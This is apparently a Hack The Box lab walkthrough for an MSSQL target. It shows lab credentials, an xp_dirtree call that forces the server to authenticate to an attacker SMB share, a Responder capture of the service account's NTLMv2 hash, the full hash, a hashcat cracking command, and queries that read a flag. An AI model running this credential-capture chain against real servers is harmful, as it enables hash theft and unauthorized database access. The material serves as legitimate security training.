
`user: htbdbuser`

`password: MSSQLAccess01!`

`$TARGET_IP`

## Questions:

## 1. What is the password for the "mssqlsvc" user?

### On TAB A:
```
ssqlclient.py -p 1433 htbdbuser@$TARGET_IP

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

password: MSSQLAccess01!
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL> EXEC master..xp_dirtree '\\10.10.14.153\share'
subdirectory                                                                                                                                                                                                                                                            depth

---

SQL>EXEC master..xp_dirtree '\\$localhost\share'
```

On TAB B:
```
sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.244.235
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:2ce4a96fa3bc2563:68D8F48CE244F1CDEC6E8847672F57D2:0101000000000000001B1AB6D7E7DA01D6D1C51E0725E7A60000000002000800420059005800450001001E00570049004E002D003700350052004300330052003500450047005700300004003400570049004E002D00370035005200430033005200350045004700570030002E0042005900580045002E004C004F00430041004C000300140042005900580045002E004C004F00430041004C000500140042005900580045002E004C004F00430041004C0007000800001B1AB6D7E7DA0106000400020000000800300030000000000000000000000000300000FB8DE0CAFD1CD58A5E2B968C160189C7840312128A0F118DDDC1E7E7D45C8DBC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350033000000000000000000
```

```
echo "mssqlsvc::WIN-02:2ce4a96fa3bc2563:68D8F48CE244F1CDEC6E8847672F57D2:0101000000000000001B1AB6D7E7DA01D6D1C51E0725E7A60000000002000800420059005800450001001E00570049004E002D003700350052004300330052003500450047005700300004003400570049004E002D00370035005200430033005200350045004700570030002E0042005900580045002E004C004F00430041004C000300140042005900580045002E004C004F00430041004C000500140042005900580045002E004C004F00430041004C0007000800001B1AB6D7E7DA0106000400020000000800300030000000000000000000000000300000FB8DE0CAFD1CD58A5E2B968C160189C7840312128A0F118DDDC1E7E7D45C8DBC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350033000000000000000000"  > mssqlsvchash
```
```
hashcat -m 5600 -a 0 mssqlsvchash /usr/share/wordlists/rockyou.txt
```

## 2. Enumerate the "flagDB" database and submit a flag as your answer.

```
mssqlclient.py -p 1433 mssqlsvc@$TARGET_IP -windows-auth
password: pr******1

SQL> SELECT name FROM sys.databases;
name                                                                                                                               

--------------------------------------------------------------------------------------------------------------------------------   

master                                                                                                                             

tempdb                                                                                                                             

model                                                                                                                              

msdb                                                                                                                               

hmaildb                                                                                                                            

flagDB                                                                                                                             

SQL> use flagDB
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.
SQL> SELECT table_name FROM flagDB.information_schema.tables
table_name                                                                                                                         

--------------------------------------------------------------------------------------------------------------------------------   

tb_flag                                                                                                                            

SQL>  SELECT * FROM tb_flag
flagvalue                                                                                              

----------------------------------------------------------------------------------------------------  

b'HTB{!*l0v3*#4$#!n9_4nd_*******3r}'
# [Subscribe for getting more HTB Cubes!](https://referral.hackthebox.com/mzyGKZb)
